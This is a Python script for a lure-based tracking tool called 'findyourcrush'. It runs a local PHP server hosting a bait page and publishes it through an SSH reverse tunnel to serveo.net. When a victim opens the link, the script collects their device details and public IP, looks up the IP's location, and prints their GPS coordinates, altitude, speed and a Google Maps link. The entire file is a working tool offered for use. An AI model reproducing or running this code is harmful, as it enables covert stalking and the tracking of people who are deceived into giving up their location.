#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import argparse
import requests
import subprocess as subp

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

if sys.version_info[0] < 3:
	print(R + '\n[-]' + C + ' Execute script with python3...\n' + W)
	exit()

parser = argparse.ArgumentParser()
parser.add_argument('-s', '--subdomain', help='Provide Subdomain for Serveo URL ( Optional )')
args = parser.parse_args()
subdom = args.subdomain

result = 'template/findyourcrush/php/result.txt'
info = 'template/findyourcrush/php/info.txt'
site = 'findyourcrush'
version = '1.1.3'

def banner():
	os.system('clear')
	print (G +
	r'''
__ _           _
 / _(_)_ __   __| |_   _  ___  _   _ _ __ ___
| |_| | '_ \ / _` | | | |/ _ \| | | | '__/ __|
|  _| | | | | (_| | |_| | (_) | |_| | | | (__
|_| |_|_| |_|\__,_|\__, |\___/ \__,_|_|  \___|
                   |___/
_
 _ __ _   _ ___| |__
| '__| | | / __| '_ \
| |  | |_| \__ \ | | |
|_|   \__,_|___/_| |_|
 
  ''' + W)
	print ('\n' + G + '[>]' + C + ' Created By : ' + W + 'wajahat ahmad')
	print (G + '[>]' + C + ' Version    : ' + W + version + '\n')

def serveo():
	global site, subdom
	flag = False
	print (G + '[+]' + C + ' Starting PHP Server...' + W)
	with open ('php.log', 'w') as phplog:
		subp.Popen(['php', '-S', '127.0.0.1:8080', '-t', 'template/'], stderr=phplog, stdout=phplog)

	print ('\n' + G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
	if subdom is None:
		with open ('serveo.txt', 'w') as tmpfile:
			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '80:localhost:8080', 'serveo.net'], stdout = tmpfile, stderr = tmpfile, stdin = subp.PIPE)
	else:
		with open ('serveo.txt', 'w') as tmpfile:
			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '{}.serveo.net:80:localhost:8080'.format(subdom), 'serveo.net'], stdout = tmpfile, stderr = tmpfile, stdin = subp.PIPE)
	while True:
		
		time.sleep(2)
		with open ('serveo.txt', 'r') as tmpfile:
			try:
				stdout = tmpfile.readlines()
				if flag == False:
					for elem in stdout:
						if 'HTTP' in elem:
							elem = elem.split(' ')
							url = elem[4].strip()
							url = url + '/{}/'.format(site)
							print (G + '[+]' + C + ' URL : ' + W + url)
							flag = True
						else:
							pass
				elif flag == True:
					break
			except Exception as e:
				print (e)
				pass

def wait():
	printed = False
	while True:
		time.sleep(2)
		size = os.path.getsize(result)
		if size == 0 and printed == False:
			print('\n' + G + '[+]' + C + ' Waiting for User Interaction...' + W + '\n')
			printed = True
		if size > 0:
			main()

def main():
	global result
	try:
		with open (info, 'r') as file2:
			file2 = file2.read()
			json3 = json.loads(file2)
			for value in json3['dev']:
				print(G + '[+]' + C + ' Device Information : ' + W + '\n')
				print(G + '[+]' + C + ' OS         : ' + W + value['os'])
				print(G + '[+]' + C + ' Platform   : ' + W + value['platform'])
				try:
					print(G + '[+]' + C + ' CPU Cores  : ' + W + value['cores'])
				except TypeError:
					pass
				print(G + '[+]' + C + ' RAM        : ' + W + value['ram'])
				print(G + '[+]' + C + ' GPU Vendor : ' + W + value['vendor'])
				print(G + '[+]' + C + ' GPU        : ' + W + value['render'])
				print(G + '[+]' + C + ' Resolution : ' + W + value['wd'] + 'x' + value['ht'])
				print(G + '[+]' + C + ' Browser    : ' + W + value['browser'])
				print(G + '[+]' + C + ' Public IP  : ' + W + value['ip'])
				rqst = requests.get('http://free.ipwhois.io/json/{}'.format(value['ip']))
				sc = rqst.status_code
				if sc == 200:
					data = rqst.text
					data = json.loads(data)
					print(G + '[+]' + C + ' Continent  : ' + W + data['continent'])
					print(G + '[+]' + C + ' Country    : ' + W + data['country'])
					print(G + '[+]' + C + ' Region     : ' + W + data['region'])
					print(G + '[+]' + C + ' City       : ' + W + data['city'])
					print(G + '[+]' + C + ' Org        : ' + W + data['org'])
					print(G + '[+]' + C + ' ISP        : ' + W + data['isp'])
	except ValueError:
		pass

	try:
		with open (result, 'r') as file:
			file = file.read()
			json2 = json.loads(file)
			for value in json2['info']:
				lat = value['lat']
				lon = value['lon']
				acc = value['acc']
				alt = value['alt']
				dir = value['dir']
				spd = value['spd']

				print ('\n' + G + '[+]' + C + ' Location Information : ' + W + '\n')
				print (G + '[+]' + C + ' Latitude  : ' + W + lat + C + ' deg')
				print (G + '[+]' + C + ' Longitude : ' + W + lon + C + ' deg')
				print (G + '[+]' + C + ' Accuracy  : ' + W + acc + C + ' m')

				if alt == '':
					print (R + '[-]' + C + ' Altitude  : ' + W + 'Not Available')
				else:
					print (G + '[+]' + C + ' Altitude  : ' + W + alt + C + ' m')

				if dir == '':
					print (R + '[-]' + C + ' Direction : ' + W + 'Not Available')
				else:
					print (G + '[+]' + C + ' Direction : ' + W + dir + C + ' deg')

				if spd == '':
					print (R + '[-]' + C + ' Speed     : ' + W + 'Not Available')
				else:
					print (G + '[+]' + C + ' Speed     : ' + W + spd + C + ' m/s')
	except ValueError:
		error = file
		print ('\n' + R + '[-] ' + W + error)
		repeat()

	def maps():
		print ('\n' + G + '[+]' + C + ' Google Maps : ' + W + 'https://www.google.com/maps/place/' + lat + '+' + lon)
		repeat()
	maps()

def clear():
	global result
	with open (result, 'w+'): pass
	with open (info, 'w+'): pass

def repeat():
	clear()
	wait()
	main()

def quit():
	global result
	with open (result, 'w+'): pass
	os.system('pkill php')
	exit()

try:
	banner()
	serveo()
	wait()
	main()

except KeyboardInterrupt:
	print ('\n' + R + '[!]' + C + ' Keyboard Interrupt.' + W)
	quit()
